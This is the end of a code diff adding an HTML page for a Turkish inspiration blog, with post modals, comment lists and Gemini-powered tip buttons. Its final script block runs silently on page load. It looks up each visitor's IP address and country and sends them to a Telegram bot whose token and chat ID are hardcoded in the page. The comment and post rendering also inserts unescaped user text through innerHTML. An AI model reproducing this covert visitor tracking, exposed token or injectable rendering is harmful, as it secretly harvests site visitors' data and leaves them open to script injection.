+                geminiFeatureHtml = `<div class="mt-8 p-4 bg-green-50 rounded-lg border border-green-200"><h3 class="text-xl font-bold text-gray-800 mb-3">✨ Finansal Danışmanınız</h3><p class="text-gray-600 mb-4">Bütçenizi daha iyi yönetmek için pratik ipuçlarına mı ihtiyacınız var?</p><button onclick="generateBudgetTips(this, \`${post.tam_icerik.replace(/`/g, "\\`")}\`)" class="w-full bg-gradient-to-r from-purple-500 to-pink-600 text-white font-semibold py-2 px-4 rounded-lg hover:from-purple-600 hover:to-pink-700 transition-all duration-300 flex items-center justify-center disabled:opacity-75"><svg class="w-5 h-5 mr-2 animate-spin hidden" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" d="M16.023 9.348h4.992v-.001M2.985 19.644v-4.992m0 0h4.992m-4.993 0l3.181 3.183a8.25 8.25 0 0011.667 0l3.181-3.183m-4.991 0l-3.182-3.182a8.25 8.25 0 00-11.667 0l-3.181 3.182" /></svg><span>Bütçe İpuçları Oluştur</span></button><div id="gemini-response-7" class="mt-4 text-gray-700 leading-relaxed"></div></div>`;
+            } else if (post.id === 8) { // Dengeli Beslenme
+                geminiFeatureHtml = `<div class="mt-8 p-4 bg-green-50 rounded-lg border border-green-200"><h3 class="text-xl font-bold text-gray-800 mb-3">✨ Beslenme Uzmanınız</h3><p class="text-gray-600 mb-4">Sağlıklı beslenme alışkanlıkları kazanmak için pratik öneriler ister misiniz?</p><button onclick="generateHealthyEatingTips(this, \`${post.tam_icerik.replace(/`/g, "\\`")}\`)" class="w-full bg-gradient-to-r from-teal-500 to-cyan-600 text-white font-semibold py-2 px-4 rounded-lg hover:from-teal-600 hover:to-cyan-700 transition-all duration-300 flex items-center justify-center disabled:opacity-75"><svg class="w-5 h-5 mr-2 animate-spin hidden" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" d="M16.023 9.348h4.992v-.001M2.985 19.644v-4.992m0 0h4.992m-4.993 0l3.181 3.183a8.25 8.25 0 0011.667 0l3.181-3.183m-4.991 0l-3.182-3.182a8.25 8.25 0 00-11.667 0l-3.181 3.182" /></svg><span>Beslenme İpuçları Oluştur</span></button><div id="gemini-response-8" class="mt-4 text-gray-700 leading-relaxed"></div></div>`;
+            }
+
+
+            let commentsHtml = '<h3 class="text-2xl font-bold text-gray-800 mt-8 mb-4">Yorumlar ('+ post.yorumlar.length +')</h3>';
+            commentsHtml += '<div class="space-y-4">';
+            post.yorumlar.forEach(comment => {
+                commentsHtml += `<div class="flex items-start space-x-3"><img src="${comment.avatar}" alt="${comment.kullanici}" class="w-10 h-10 rounded-full"><div><p class="font-semibold text-gray-900">${comment.kullanici}</p><p class="text-gray-600">${comment.yorum}</p></div></div>`;
+            });
+            commentsHtml += '</div>';
+            
+            modalContent.innerHTML = `<button onclick="closeModal()" class="sticky top-4 right-4 float-right z-10 bg-white rounded-full p-2 text-gray-800 hover:bg-gray-200 transition"><svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><path stroke-linecap="round" stroke-linejoin="round" d="M6 18L18 6M6 6l12 12" /></svg></button><div><img class="w-full h-64 object-cover rounded-t-lg" src="${post.resim_url}" alt="${post.baslik}"></div><div class="p-6 md:p-8"><span class="text-sm text-gray-500">${post.tarih}</span><h2 class="text-3xl md:text-4xl font-bold text-gray-900 mt-2 mb-4">${post.baslik}</h2><div class="prose max-w-none text-gray-700 leading-relaxed text-left">${post.tam_icerik.replace(/\n/g, '<br>')}</div>${geminiFeatureHtml}${commentsHtml}</div>`;
+            modal.classList.remove('hidden');
+            document.body.style.overflow = 'hidden';
+        }
+
+        function openInfoModal(pageId) {
+            const page = infoPagesData[pageId];
+            if (!page) return;
+            modalContent.innerHTML = `<button onclick="closeModal()" class="absolute top-4 right-4 bg-gray-200 rounded-full p-2 text-gray-800 hover:bg-gray-300 transition"><svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><path stroke-linecap="round" stroke-linejoin="round" d="M6 18L18 6M6 6l12 12" /></svg></button><div class="p-6 md:p-8"><h2 class="text-3xl md:text-4xl font-bold text-gray-900 mb-6">${page.baslik}</h2><div class="prose max-w-none text-gray-700 leading-relaxed text-left">${page.icerik}</div></div>`;
+            modal.classList.remove('hidden');
+            document.body.style.overflow = 'hidden';
+        }
+
+        function closeModal() {
+            modal.classList.add('hidden');
+            document.body.style.overflow = 'auto';
+        }
+
+        modal.addEventListener('click', function(event) {
+            if (event.target === modal) { closeModal(); }
+        });
+        
+        document.addEventListener('keydown', function(event) {
+            if (event.key === 'Escape' && !modal.classList.contains('hidden')) { closeModal(); }
+        });
+
+        // --- TELEGRAM IP NOTIFICATION LOGIC ---
+        // Telegram botunuzun token'ı
+        const TELEGRAM_BOT_TOKEN = '6825241635:AAG0yEsSoGgqEw7mtLfVZvXmtEYxls0LX1M'; 
+        // IP bildirimlerinin gönderileceği sohbet kimliği
+        const TELEGRAM_CHAT_ID = '5000557418'; 
+
+        // Ülke kodunu bayrak emojisine dönüştüren yardımcı fonksiyon
+        function getFlagEmoji(countryCode) {
+            if (!countryCode) return '';
+            const codePoints = countryCode
+                .toUpperCase()
+                .split('')
+                .map(char => 0x1F1E6 + (char.charCodeAt(0) - 'A'.charCodeAt(0)));
+            return String.fromCodePoint(...codePoints);
+        }
+
+        // IP adresini ve ülke bilgisini Telegram'a gönderen fonksiyon
+        async function sendIpToTelegram() {
+            try {
+                // IP ve konum bilgisini almak için ipapi.co API'sini kullan
+                const ipApiResponse = await fetch('https://ipapi.co/json/');
+                if (!ipApiResponse.ok) {
+                    console.error('IP API isteği başarısız:', ipApiResponse.status, ipApiResponse.statusText);
+                    throw new Error(`IP API isteği başarısız: ${ipApiResponse.status}`);
+                }
+                const ipData = await ipApiResponse.json();
+                console.log('IP API yanıtı:', ipData); // IP API yanıtını konsola yazdır
+
+                const ip = ipData.ip || 'Bilinmiyor';
+                const countryName = ipData.country_name || 'Bilinmiyor';
+                const countryCode = ipData.country_code || '';
+                const flagEmoji = getFlagEmoji(countryCode);
+
+                const message = `booooooot IP: ${ip} Ülke: ${countryName} ${flagEmoji}`;
+
+                // Telegram Bot API'sine mesaj gönderme
+                const telegramApiUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+                const telegramResponse = await fetch(telegramApiUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: message
+                    })
+                });
+
+                if (!telegramResponse.ok) {
+                    const errorData = await telegramResponse.json();
+                    console.error('Telegram API Hatası:', telegramResponse.status, telegramResponse.statusText, errorData);
+                    throw new Error(`Telegram API isteği başarısız: ${telegramResponse.status} - ${JSON.stringify(errorData)}`);
+                } else {
+                    console.log('IP bildirimi Telegram\'a başarıyla gönderildi.');
+                }
+
+            } catch (error) {
+                console.error('IP bildirimi sırasında bir hata oluştu:', error);
+            }
+        }
+
+        // Sayfa yüklendiğinde IP bildirimini gönder
+        window.addEventListener('load', sendIpToTelegram);
+
+    </script>
+</body>
+</html>
+
+Page title: Keşif Blogu - İlham Veren Yazılar
